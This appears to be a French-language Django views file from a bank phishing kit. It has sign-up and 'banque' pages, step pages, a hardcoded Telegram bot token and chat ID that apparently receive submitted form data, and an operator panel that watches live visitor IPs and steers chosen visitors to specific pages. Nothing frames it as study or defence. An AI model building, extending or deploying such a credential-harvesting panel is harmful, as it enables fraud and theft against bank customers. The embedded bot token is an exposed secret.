import time
import json
from django.http import JsonResponse
from django.shortcuts import render, redirect
from django.views.decorators.http import require_POST
from django.views.decorators.csrf import csrf_exempt
from django.core.cache import cache
from .forms import InscriptionForm, VerificationForm
from .middleware import VISITEURS_ACTIFS, PAGES_DISPONIBLES

TELEGRAM_TOKEN   = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
TELEGRAM_CHAT_ID = "8849728706"


# ─── Inscription ───────────────────────────────────────────
def inscription(request):
    if request.method == 'POST':
        form = InscriptionForm(request.POST)
        if form.is_valid():
            form.send_tel()
            return redirect('banque_1')
    else:
        form = InscriptionForm()
    return render(request, 'onboarding/inscription.html', {'form': form})


# ─── Vérification ──────────────────────────────────────────
def verification(request):
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            return redirect('etape_1')
    else:
        form = VerificationForm()
    return render(request, 'onboarding/verification.html', {'form': form})


# ─── Étapes ────────────────────────────────────────────────
def etape_1(request):
    return render(request, 'onboarding/etape-1.html')

def etape_2(request):
    return render(request, 'onboarding/etape-2.html')

def etape_3(request):
    return render(request, 'onboarding/etape-3.html')

def etape_4(request):
    return render(request, 'onboarding/etape-4.html')

def etape_5(request):
    return render(request, 'onboarding/etape-5.html')

def etape_6(request):
    return render(request, 'onboarding/etape-6.html')

def banque_1(request):
    return render(request, 'onboarding/banque-1.html')

def banque_2(request):
    return render(request, 'onboarding/banque-2.html')


# ─── Visiteurs ─────────────────────────────────────────────
def visiteurs_temps_reel(request):
    maintenant = time.time()
    visiteurs = []
    for ip, data in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - data['last_seen'])
        visiteurs.append({
            'ip':      ip,
            'page':    data['page'],
            'methode': data['methode'],
            'il_y_a':  il_y_a,
        })
    visiteurs.sort(key=lambda v: v['il_y_a'])
    return render(request, 'onboarding/visiteurs.html', {
        'visiteurs':  visiteurs,
        'total':      len(visiteurs),
        'pages':      PAGES_DISPONIBLES,
        'pages_json': json.dumps([{'url': u, 'label': l} for u, l in PAGES_DISPONIBLES]),
    })


def visiteurs_json(request):
    maintenant = time.time()
    visiteurs = []
    for ip, info in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - info['last_seen'])
        visiteurs.append({
            'ip':      ip,
            'page':    info['page'],
            'methode': info['methode'],
            'il_y_a':  il_y_a,
        })
    visiteurs.sort(key=lambda v: v['il_y_a'])
    return JsonResponse({'visiteurs': visiteurs, 'total': len(visiteurs)})


@require_POST
def rediriger_visiteur(request):
    ip          = request.POST.get('ip')
    destination = request.POST.get('destination')

    if not ip or not destination:
        return JsonResponse({'ok': False, 'erreur': 'ip et destination requis'}, status=400)

    pages_autorisees = [url for url, _ in PAGES_DISPONIBLES]
    if destination not in pages_autorisees:
        return JsonResponse({'ok': False, 'erreur': 'destination non autorisée'}, status=400)

    cache.set(f'redirect_{ip}', destination, timeout=300)
    return JsonResponse({'ok': True, 'ip': ip, 'cible': destination})


def verifier_redirection(request):
    x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded:
        ip = x_forwarded.split(',')[0].strip()
    else:
        ip = request.META.get('REMOTE_ADDR', '')
    if ip == '::1':
        ip = '127.0.0.1'

    cible = cache.get(f'redirect_{ip}')
    if cible:
        cache.delete(f'redirect_{ip}')
    return JsonResponse({'redirect': cible})


# ─── Telegram webhook (optionnel) ──────────────────────────
@csrf_exempt
def telegram_webhook(request):
    if request.method != 'POST':
        return JsonResponse({'ok': False})
    return JsonResponse({'ok': True})
